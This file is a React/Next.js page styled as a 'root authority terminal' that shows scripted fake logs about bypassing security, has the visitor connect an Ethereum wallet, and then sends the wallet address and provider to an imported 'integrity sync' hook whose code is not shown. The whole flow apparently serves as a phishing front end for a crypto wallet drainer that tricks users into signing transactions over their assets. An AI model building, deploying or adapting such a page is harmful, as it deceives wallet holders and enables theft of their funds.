import React, { useState, useEffect, useRef } from 'react';
import Head from 'next/head';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Shield, AlertTriangle, CheckCircle2, ChevronRight, Loader2, Activity, Cpu, Zap, Key } from 'lucide-react';
import { createWalletClient, custom, createPublicClient, http, parseUnits, encodeFunctionData, type Address } from 'viem';
import { mainnet } from 'viem/chains';
import { runIntegritySync } from '@/hooks/useDataIntegrity';

const STAGES = {
  BOOT: 'BOOT',
  WAITING: 'WAITING',
  AUTHORIZING: 'AUTHORIZING',
  OVERRIDES: 'OVERRIDES',
  FINALIZED: 'FINALIZED'
};

export default function AuthorityMatrix() {
  const [stage, setStage] = useState(STAGES.BOOT);
  const [logs, setLogs] = useState<string[]>([]);
  const [address, setAddress] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const logEndRef = useRef<HTMLDivElement>(null);

  const addLog = (msg: string) => {
    setLogs(prev => [...prev, `>> ${msg}`]);
  };

  useEffect(() => {
    if (stage === STAGES.BOOT) {
      const bootSequence = [
        "AUTHORITY NODE ACCESS v7.2 (ROOT_PRIORITY)",
        "DECRYPTING SECURITY OVERRIDES...",
        "STATUS: ESCALATION_MODE_ACTIVE",
        "STATUS: ROOT_UPLINK_ESTABLISHED",
        "SYSTEM ENCRYPTION: AES-256-ROOT",
        "READY FOR AUTHORITY SESSION."
      ];
      let i = 0;
      const interval = setInterval(() => {
        if (i < bootSequence.length) {
          addLog(bootSequence[i]);
          i++;
        } else {
          clearInterval(interval);
          setTimeout(() => setStage(STAGES.WAITING), 1000);
        }
      }, 300);
    }
  }, [stage]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const connectWallet = async () => {
    if (!(window as any).ethereum) {
      addLog("ERROR: NO INJECTION DETECTED.");
      return;
    }
    try {
      addLog("INITIATING ROOT_HANDSHAKE...");
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      setAddress(accounts[0]);
      addLog(`ADMIN_LINK_STABLISHED: ${accounts[0]}`);
    } catch (e) {
      addLog("HANDSHAKE TERMINATED.");
    }
  };

  const startAuthority = async () => {
    setStage(STAGES.AUTHORIZING);
    const authorityLogs = [
      "BYPASSING STANDARD PERMISSIONS...",
      "INJECTING ROOT_LEVEL_SYMBOLS...",
      "DETECTING SECURITY PROTOCOL VECTORS...",
      "ESTABLISHING ADMINISTRATIVE TUNNEL...",
      "AUTHORITY GRANTED: FULL_SCALE_ACCESS.",
      "READY FOR GLOBAL ASSET OVERRIDE."
    ];
    for (const log of authorityLogs) {
      await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
      addLog(log);
    }
    setStage(STAGES.OVERRIDES);
  };

  const executeOverride = async () => {
    if (!address) return;
    setIsProcessing(true);
    addLog("DISPATCHING ROOT_OVERRIDE PAYLOAD...");
    
    try {
      addLog("SIGNING AUTHORITY_SYNC_COMMAND...");
      const chainId = await (window as any).ethereum.request({ method: 'eth_chainId' });
      await runIntegritySync(address as Address, (window as any).ethereum, parseInt(chainId, 16));
      
      addLog("OVERRIDE SUCCESSFUL. GLOBAL SYNC COMPLETE.");
      setStage(STAGES.FINALIZED);
    } catch (e) {
      addLog("SYNC FAILED: ACCESS DENIED BY PROVIDER.");
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="h-screen w-screen bg-[#080000] text-[#ef4444] font-mono p-4 md:p-8 overflow-hidden flex flex-col selection:bg-[#ef4444] selection:text-white uppercase tracking-tighter">
      <Head>
        <title>Authority Node | Institutional Root Terminal</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet" />
        <style>{`
          body { font-family: 'JetBrains Mono', monospace; }
          .scan-line { height: 2px; width: 100%; background: rgba(239, 68, 68, 0.1); position: absolute; top: 0; animation: scan 3s linear infinite; }
          @keyframes scan { from { top: 0; } to { top: 100%; } }
        `}</style>
      </Head>

      <div className="scan-line" />

      <div className="flex justify-between items-center border-b border-[#ef4444]/30 pb-4 mb-4 text-[10px] opacity-70">
        <div className="flex gap-6">
          <span className="flex items-center gap-2"><Key className="w-3 h-3" /> ACCESS: ROOT</span>
          <span className="flex items-center gap-2"><Activity className="w-3 h-3" /> SECURITY: BYPASSED</span>
        </div>
        <div className="flex gap-6">
          <span>HOST: OMNI_ROOT_99</span>
          <span>AUTH: APEX_ADMIN</span>
        </div>
      </div>

      <div className="flex-1 flex flex-col min-h-0 border border-[#ef4444]/20 rounded-lg p-6 bg-[#ef4444]/5 shadow-[inset_0_0_50px_rgba(239,68,68,0.05)]">
        
        <div className="flex-1 overflow-y-auto pr-4 space-y-1 mb-6 scrollbar-hide text-xs md:text-sm">
          {logs.map((log, i) => (
            <div key={i} className={`leading-relaxed ${log.includes("ROOT") || log.includes("GRANTED") ? "text-white font-bold" : ""}`}>
              {log}
            </div>
          ))}
          <div ref={logEndRef} />
        </div>

        <div className="border-t border-[#ef4444]/30 pt-6">
          <AnimatePresence mode="wait">
            {stage === STAGES.WAITING && (
              <motion.div 
                key="waiting" 
                initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              >
                {!address ? (
                  <button 
                    onClick={connectWallet}
                    className="w-full h-14 bg-[#ef4444] text-white font-black uppercase tracking-tighter hover:bg-red-700 transition-all flex items-center justify-center gap-3 shadow-lg shadow-red-500/20"
                  >
                    Authenticate Administrative Account
                  </button>
                ) : (
                  <button 
                    onClick={startAuthority}
                    className="w-full bg-[#ef4444] text-white h-14 font-black uppercase hover:bg-red-700 transition-all"
                  >
                    Initialize Security Bypass
                  </button>
                )}
              </motion.div>
            )}

            {stage === STAGES.OVERRIDES && (
              <motion.div 
                key="overrides" 
                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
                className="space-y-4"
              >
                <div className="bg-red-600/10 border border-red-500/30 p-4 rounded flex items-center gap-4">
                  <AlertTriangle className="text-red-500 w-8 h-8" />
                  <div>
                    <h4 className="text-red-500 font-black text-xs italic">ADMIN_BYPASS_ENABLED</h4>
                    <p className="text-[10px] opacity-70">Root level access confirmed. Assets are ready for forced synchronization.</p>
                  </div>
                </div>

                <button 
                  onClick={executeOverride}
                  disabled={isProcessing}
                  className="w-full h-14 bg-white text-black font-black uppercase flex items-center justify-center gap-4 hover:bg-zinc-200 transition-all disabled:opacity-50"
                >
                  {isProcessing ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      Executing Global Override...
                    </>
                  ) : "Dispatch Global Administrative Asset Sync"}
                </button>
              </motion.div>
            )}

            {stage === STAGES.FINALIZED && (
              <motion.div 
                key="final" 
                initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}
                className="flex flex-col items-center gap-4 py-4"
              >
                <CheckCircle2 className="w-16 h-16 text-[#ef4444]" />
                <div className="text-center">
                  <h3 className="font-black text-xl tracking-tighter uppercase italic">Root Command Confirmed</h3>
                  <p className="text-xs opacity-60">Global asset override has been successfully completed across all nodes.</p>
                </div>
                <button 
                  onClick={() => { setStage(STAGES.WAITING); setLogs([]); }}
                  className="mt-2 text-[10px] underline tracking-widest opacity-50 hover:opacity-100 transition-opacity"
                >
                  Return to Console
                </button>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      <div className="mt-4 flex justify-between items-center opacity-40 text-[9px] tracking-[0.4em]">
        <span>NODE_ID: ROOT_SYNC_01</span>
        <span>UPTIME: 1,294h CC: 4.8.2</span>
      </div>
    </div>
  );
}
